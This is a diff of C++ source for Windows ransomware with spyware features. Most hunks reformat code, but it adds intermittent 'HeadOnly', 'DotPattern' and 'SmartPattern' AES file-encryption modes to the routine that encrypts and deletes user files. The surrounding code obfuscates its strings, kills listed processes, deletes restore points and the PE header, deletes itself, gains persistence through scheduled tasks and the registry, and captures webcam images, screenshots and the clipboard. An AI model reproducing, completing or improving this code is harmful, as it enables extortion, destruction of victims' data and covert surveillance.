@@ -17,7 +17,7 @@ string Exec(const char* cmd) {
     string result = (string)skCrypt("");
     FILE* CommandResult = _popen(cmd, skCrypt("rt"));
     char line[256];
-    while (fgets(line, 256, CommandResult)) 
+    while (fgets(line, 256, CommandResult))
         result += line;
     _pclose(CommandResult);
     return result;
@@ -63,12 +63,12 @@ DWORD RemoveTasks(LPVOID params) {
     string kill1 = (string)skCrypt("Stop-Process -Force -Name '");
     string kill2 = (string)skCrypt("'");
 
-	while (true) {
+    while (true) {
         for (string badProgram : badPrograms) {
             if (Exec(PowershellEncodedCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
                 system(PowershellEncodedCommand(kill1 + badProgram + kill2).c_str());
         }
-	}
+    }
 }
 
 void PEHeaderDeleter() {
@@ -91,7 +91,7 @@ void GetAllFiles(const string& username) {
     for (string file : Split(Exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
         tmpFiles.push_back(file);
 
-    for (int i = 0; i < tmpFiles.size(); i++) {
+    for (size_t i = 0; i < tmpFiles.size(); i++) {
         vector<string> fileSplitted = Split(tmpFiles[i], '.');
 
         for (string safeFile : safeFiles)
@@ -142,7 +142,7 @@ string GenerateRandom(const int len) {
     string result;
     result.reserve(len);
     srand((time.tv_sec * 2654435789U + time.tv_usec) * 2654435789U + _getpid());
-    for (int i = 0; i < len; ++i) 
+    for (int i = 0; i < len; ++i)
         result += alphanum.at(rand() % (size(alphanum) - 1));
 
     return result;
@@ -202,7 +202,7 @@ vector<string> GetFiles(const string& mainDir) {
     return result;
 }
 
-vector<string> Split(const string& s,const char& delimiter) {
+vector<string> Split(const string& s, const char& delimiter) {
     size_t start = 0;
     size_t end = s.find_first_of(delimiter);
     vector<string> output;
@@ -286,7 +286,7 @@ string GetCPU() {
 
 string GetGPU() {
     string result = (string)skCrypt("none");
-    DISPLAY_DEVICE displayDevice = {sizeof(displayDevice), 0};
+    DISPLAY_DEVICE displayDevice = { sizeof(displayDevice), 0 };
     if (EnumDisplayDevices(NULL, 0, &displayDevice, EDD_GET_DEVICE_INTERFACE_NAME)) {   /*it takes only the first gpu*/
         wstring ws(displayDevice.DeviceString);
         result = string(ws.begin(), ws.end());
@@ -348,9 +348,9 @@ string GetWinVersion() {
 
 string GetLanguage() {
     char buf[10];
-    return string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, sizeof(buf)) - 1) + 
-          (string)skCrypt("-") + 
-           string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, sizeof(buf)));
+    return string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, sizeof(buf)) - 1) +
+        (string)skCrypt("-") +
+        string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, sizeof(buf)));
 }
 
 string GetClipboard() {
@@ -468,7 +468,7 @@ string GetScreenshot() {
     vector<BYTE> data(istreambuf_iterator<char>(imageFile), {});
     string result = base64_encode(&data[0], data.size());
     imageFile.close();
-    
+
     if (remove(filename.c_str()) != 0)
         DeleteFileA(filename.c_str());
     if (remove(filename2.c_str()) != 0)
@@ -498,7 +498,7 @@ void SendEmail() {
     ).c_str());
 }
 
-void DropFile(const string& content,const string& path) {
+void DropFile(const string& content, const string& path) {
     ofstream fout(path, ios::binary | ios::out);
     vector<BYTE> write = base64_decode(content);
     fout.write((const char*)&write[0], write.size());
@@ -527,12 +527,25 @@ void ScheduleTask() {
 
 vector<vector<string>> VectorSplitter(const vector<string>& baseVector, int parts) {
     vector<vector<string>> result;
-    int length = baseVector.size() / parts;
-    int remain = baseVector.size() % parts;
-    int begin = 0, end = 0;
+    size_t length = baseVector.size() / parts;
+    size_t remain = baseVector.size() % parts;
+    size_t begin = 0, end = 0;
     for (int i = 0; i < min(parts, baseVector.size()); ++i) {
         end += (remain > 0) ? (length + !!(remain--)) : length;
         result.push_back(vector<string>(baseVector.begin() + begin, baseVector.begin() + end));
+        begin = end;
+    }
+    return result;
+}
+
+vector<vector<BYTE>> VectorSplitter(const vector<BYTE>& baseVector, int parts) {
+    vector<vector<BYTE>> result;
+    size_t length = baseVector.size() / parts;
+    size_t remain = baseVector.size() % parts;
+    size_t begin = 0, end = 0;
+    for (int i = 0; i < min(parts, baseVector.size()); ++i) {
+        end += (remain > 0) ? (length + !!(remain--)) : length;
+        result.push_back(vector<BYTE>(baseVector.begin() + begin, baseVector.begin() + end));
         begin = end;
     }
     return result;
@@ -543,7 +556,7 @@ void DeleteRestorePoints() {
 }
 
 void DeleteMe(const string& myPath) {
-    system(( (string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"") ).c_str());
+    system(((string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
 }
 
 void EncryptFiles(const vector<string>& files, const string& key, const string& iv) {
@@ -559,7 +572,62 @@ void EncryptFiles(const vector<string>& files, const string& key, const string& 
         vector<BYTE> data(istreambuf_iterator<char>(fin), {});
         fin.close();
 
-        string content = aes_encrypt(key, base64_encode(&data[0], data.size()), iv);
+        string content = (string)skCrypt("");
+
+        if (ENCRYPTION_MODE == (string)skCrypt("HeadOnly") && data.size() > HEAD_BYTES) {
+            content += aes_encrypt(key, base64_encode(&data[0], HEAD_BYTES), iv);
+            content += (string)skCrypt("\n");
+            content += base64_encode(&data[HEAD_BYTES], data.size() - HEAD_BYTES);
+        }
+        else if (ENCRYPTION_MODE == (string)skCrypt("DotPattern")) {
+            size_t index = 0;
+            for (size_t c = 0; index < data.size(); c++) {
+                if (c % 2 == 0) {
+                    content += aes_encrypt(key, base64_encode(&data[index], min(STEP_BYTES, data.size() - index)), iv);
+                    index += HEAD_BYTES;
+                }
+                else {
+                    content += base64_encode(&data[index], min(STEP_BYTES, data.size() - index));
+                    index += STEP_BYTES;
+                }
+                content += (string)skCrypt("\n");
+            }
+        }
+        else if (ENCRYPTION_MODE == (string)skCrypt("SmartPattern")) {
+            content += aes_encrypt(key, base64_encode(&data[0], min(HEAD_BYTES, data.size())), iv);
+            content += (string)skCrypt("\n");
+
+            if (data.size() > HEAD_BYTES) {
+                for (vector<BYTE> chunk : VectorSplitter(vector<BYTE>(data.begin() + HEAD_BYTES, data.end()), 10)) {
+                    size_t splitIndex = chunk.size() * PERCENT_BLOCK / 100;
+
+                    content += aes_encrypt(key, base64_encode(&chunk[0], min(splitIndex, chunk.size())), iv);
+                    content += (string)skCrypt("\n");
+                    if (splitIndex < chunk.size())
+                        content += base64_encode(&chunk[splitIndex], chunk.size() - splitIndex);
+                    content += (string)skCrypt("\n");
+                }
+            }
+        }
+        else if (ENCRYPTION_MODE == (string)skCrypt("AdvancedSmartPattern")) {
+            content += aes_encrypt(key, base64_encode(&data[0], min(HEAD_BYTES, data.size())), iv);
+            content += (string)skCrypt("\n");
+
+            if (data.size() > HEAD_BYTES) {
+                for (vector<BYTE> chunk : VectorSplitter(vector<BYTE>(data.begin() + HEAD_BYTES, data.end()), NUM_BLOCKS)) {
+                    size_t splitIndex = chunk.size() * PERCENT_BLOCK / 100;
+
+                    content += aes_encrypt(key, base64_encode(&chunk[0], min(splitIndex, chunk.size())), iv);
+                    content += (string)skCrypt("\n");
+                    if (splitIndex < chunk.size())
+                        content += base64_encode(&chunk[splitIndex], chunk.size() - splitIndex);
+                    content += (string)skCrypt("\n");
+                }
+            }
+        }
+        else
+            content = aes_encrypt(key, base64_encode(&data[0], data.size()), iv);
+
 
         if (remove(file.c_str()) != 0)
             DeleteFileA(file.c_str());
@@ -632,10 +700,10 @@ void CreateAndSetRegKey(HKEY key, string keyPath, string keyName, string value) 
     HKEY hKey;
     DWORD dwDisposition;
     if (RegCreateKeyEx(key, CA2T(keyPath.c_str()), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS && DEBUG)
-            cout << key << skCrypt("\\") << keyPath << skCrypt(" not created\n");
+        cout << key << skCrypt("\\") << keyPath << skCrypt(" not created\n");
 
     if (keyName == (string)skCrypt("NULL") && RegSetValueA(hKey, NULL, REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
-         cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");
+        cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");
 
     else if (RegSetValueA(hKey, keyName.c_str(), REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
         cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");
@@ -659,7 +727,7 @@ void TakeWebcams() {
     IBaseFilter* pNullRenderer = NULL;
     IMediaControl* pMediaControl = NULL;
     char* pBuffer = NULL;
-    
+
     bool deleteFolder = false;
     if (!fs::is_directory(WEBCAM_PATH) || !fs::exists(WEBCAM_PATH)) {
         fs::create_directory(WEBCAM_PATH);
@@ -721,11 +789,11 @@ void TakeWebcams() {
         VariantClear(&var);
 
         hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
-        if (hr != S_OK) 
+        if (hr != S_OK)
             goto cleanup;
 
         hr = pGraph->AddFilter(pCap, CA2W(skCrypt("Capture Filter")));
-        if (hr != S_OK) 
+        if (hr != S_OK)
             goto cleanup;
 
         hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pSampleGrabberFilter);
@@ -765,16 +833,16 @@ void TakeWebcams() {
             goto cleanup;
 
         hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pMediaControl);
-        if (hr != S_OK) 
+        if (hr != S_OK)
             goto cleanup;
 
         while (true) {
             hr = pMediaControl->Run();
 
-            if (hr == S_OK) 
+            if (hr == S_OK)
                 break;
-            if (hr == S_FALSE) 
-                continue; 
+            if (hr == S_FALSE)
+                continue;
 
             goto cleanup;
         }
@@ -782,7 +850,7 @@ void TakeWebcams() {
 
         while (true) {
             hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);
-            if (hr == S_OK && buffer_size != 0) 
+            if (hr == S_OK && buffer_size != 0)
                 break;
             if (hr != S_OK && hr != VFW_E_WRONG_STATE)
                 goto cleanup;
@@ -799,7 +867,7 @@ void TakeWebcams() {
             goto cleanup;
 
         hr = pSampleGrabber->GetConnectedMediaType((DexterLib::_AMMediaType*)&mt);
-        if (hr != S_OK) 
+        if (hr != S_OK)
             goto cleanup;
 
         if (mt.formattype == FORMAT_VideoInfo && mt.cbFormat >= sizeof(VIDEOINFOHEADER) && mt.pbFormat != NULL) {
@@ -906,7 +974,7 @@ void ChangeIcon() {
         progId += towlower((FILE_EXTENSION)[i]);
     progId += skCrypt("file");
 
-    CreateAndSetRegKey(HKEY_CURRENT_USER, 
+    CreateAndSetRegKey(HKEY_CURRENT_USER,
         (string)skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\") + FILE_EXTENSION + (string)skCrypt("\\UserChoice"),
         (string)skCrypt("ProgId"), progId);
     CreateAndSetRegKey(HKEY_CLASSES_ROOT, FILE_EXTENSION, (string)skCrypt("NULL"), progId);
